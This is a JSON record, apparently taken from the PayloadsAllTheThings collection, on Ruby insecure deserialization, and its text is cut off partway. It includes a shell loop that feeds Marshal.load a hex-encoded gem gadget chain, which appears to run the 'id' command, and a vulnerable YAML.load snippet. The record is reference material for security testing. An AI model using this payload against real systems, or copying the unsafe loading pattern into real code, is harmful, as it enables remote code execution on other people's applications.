{
  "id": "insecure_deserialization-2a925c0b9bff",
  "category": "Insecure Deserialization",
  "title": "Ruby",
  "description": "# Ruby Deserialization\n\n> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.\n\n## Summary\n\n* [Marshal Deserialization](#marshal-deserialization)\n* [YAML Deserialization](#yaml-deserialization)\n* [References](#references)\n\n## Marshal Deserialization\n\nScript to generate and verify the deseria",
  "payloads": [
    "# Ruby Deserialization",
    "> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.",
    "## Summary",
    "* [Marshal Deserialization](#marshal-deserialization)",
    "* [YAML Deserialization](#yaml-deserialization)",
    "* [References](#references)",
    "## Marshal Deserialization",
    "Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5",
    "```ruby",
    "for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done",
    "## YAML Deserialization",
    "Vulnerable code",
    "```ruby",
    "require \"yaml\"",
    "YAML.load(File.read(\"p.yml\"))"
  ],
  "source": "PayloadsAllTheThings",
  "references": [
    "PayloadsAllTheThings/Insecure Deserialization/Ruby.md"
  ]
}